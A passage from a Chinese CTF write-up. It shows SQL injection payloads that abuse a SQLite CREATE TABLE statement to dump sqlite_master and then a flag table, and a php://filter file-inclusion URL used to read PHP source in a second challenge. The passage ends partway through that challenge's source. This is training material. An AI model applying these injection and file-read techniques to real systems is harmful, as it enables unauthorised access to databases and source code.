          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example2<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Create table<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
    $<span class="token punctuation">(</span><span class="token string">'#next'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      let num <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string">'#num'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      let len <span class="token operator">=</span> $<span class="token punctuation">(</span><span class="token string">'#table_name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">&lt;=</span> len <span class="token operator">&amp;&amp;</span> len <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token number">0</span> <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> num <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $<span class="token punctuation">(</span><span class="token string">'#info'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $<span class="token punctuation">(</span><span class="token string">'#table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          $<span class="token punctuation">(</span><span class="token string">'#table table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span>`
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][name]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][type]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">INTEGER</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REAL<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">REAL</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>TEXT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>`<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
<p>有了源码，逻辑就清晰了许多，源码中有flag表创建和插入flag的操作，可以确定flag存在于数据库中，但是对于表名和flag值都是在开始包含进来的config.php里定义的。</p>
<p>在源码中的创建表相关代码可以发现，创建表时表名，列名，列类型可能存在SQL注入：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>看一下最终拼接后的sql语句：</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> {$tName} <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>$<span class="token keyword">column</span><span class="token punctuation">`</span> $<span class="token keyword">type</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>参数都是我们可控的，type那里虽然是个下拉选择，但是直接F12就可以更改，也是可控的。</p>
<blockquote>
<p>sqlite_master表是SQLite的系统表。该表记录该数据库中保存的表、索引、视图、和触发器信息。每一行记录一个项目。在创建一个SQLIte数据库的时候，该表会自动创建。sqlite_master表包含5列。</p>
<ul>
<li><p>type列记录了项目的类型，如table、index、view、trigger。</p>
</li>
<li><p>name列记录了项目的名称，如表名、索引名等。</p>
</li>
<li><p>tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</p>
</li>
<li><p>rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。</p>
</li>
<li><p>sql列记录创建该项目的SQL语句。</p>
</li>
</ul>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036081405146.jpg" alt=""></p>
</blockquote>
<p>那我们只有只要想办法查sqlite_master表就知道flag表和对应的字段名。结合上面的sql语句，我们可以使用这种方式：</p>
<pre><code>create table aa as select xxx from xxx</code></pre><p>同时参数还经过了filter函数的处理，被检测到就显示表名非法。</p>
<p>那么通过表名，列名和类型三个地方传入payload，来拼接出我们想要执行的语句。</p>
<p>但是发现在tbname后还拼接了一些内容会造成干扰，这里可以通过 反引号 把它包裹起来，因为包裹起来的内容就成为了关键字，就相</p>
<p>于 <code>select xx as key</code>,看一下这个例子：</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036088629436.jpg" alt=""></p>
<p>同时反引号可以使用<code>[]</code>来替代绕过过滤。</p>
<p>payload1:</p>
<pre><code>在创建表时，表名: t AS SELECT sql [
列名: abc
列类型: ] FROM sqlite_master;</code></pre><p>这时的sql语句就是：</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token punctuation">[</span> <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token number">abc</span> <span class="token punctuation">]</span> <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>等价于</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036091121226.jpg" alt=""></p>
<p>得到了表名和列名，替换语句中的sql和sqlite_master 即可获得flag：</p>
<p>payload2:</p>
<pre><code>t AS SELECT flag_ThE_C0lumn [
abc
]FROM flag_Y0U_c4nt_GUESS;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036091570801.jpg" alt=""></p>
<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>存在文件包含</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16035214379499.jpg" alt=""></p>
<p>读源码：<br><a href="http://eci-2zegudi3pf4hpiupmwnp.cloudeci1.ichunqiu.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://eci-2zegudi3pf4hpiupmwnp.cloudeci1.ichunqiu.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">'main.html'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?page=main.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// You may want to see 7fa3b767c460b54a2be4d49030b349c7.php</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Home<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/bootstrap.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Custom Theme files --></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--theme-style--></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--//theme-style--></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>application/x-javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">setTimeout</span><span class="token punctuation">(</span>hideURLbar<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">hideURLbar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>

    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://fonts.googleapis.com/css?family<span class="token punctuation">=</span>Muli:400,300<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://fonts.googleapis.com/css?family<span class="token punctuation">=</span>Oswald<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- animation-effect --></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/wow.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
        <span class="token keyword">new</span> <span class="token class-name">WOW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- //animation-effect --></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span> <span class="token variable">$page</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
<p>然后去读源码里提示的文件，得到：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/www/html/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"Here is your sandbox: "</span><span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
